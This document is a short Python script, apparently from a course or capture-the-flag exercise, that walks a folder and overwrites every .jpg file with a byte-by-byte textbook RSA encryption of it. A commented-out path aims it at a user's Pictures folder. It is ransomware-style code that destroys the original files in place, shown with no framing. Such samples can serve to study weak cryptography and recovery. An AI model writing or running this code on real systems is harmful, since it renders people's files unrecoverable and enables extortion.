from os import listdir
import pickle

n = 22291846172619859445381409012451
e = 65535

# target_path = '/home/csc2022/Pictures'
target_path = './'

for fil_nam in listdir(target_path):
	if not fil_nam.endswith('.jpg'):
		continue

	with open(f'{target_path}/{fil_nam}', 'rb') as f:
		plain_bytes = f.read()
	
	cipher_int = [pow(i, e, n) for i in plain_bytes]
	with open(f'{target_path}/{fil_nam}', 'wb') as f:
		pickle.dump(cipher_int, f)